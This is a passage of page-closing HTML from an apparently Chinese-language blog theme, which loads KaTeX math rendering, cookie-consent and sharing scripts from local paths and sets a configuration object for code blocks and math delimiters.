</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
</html>
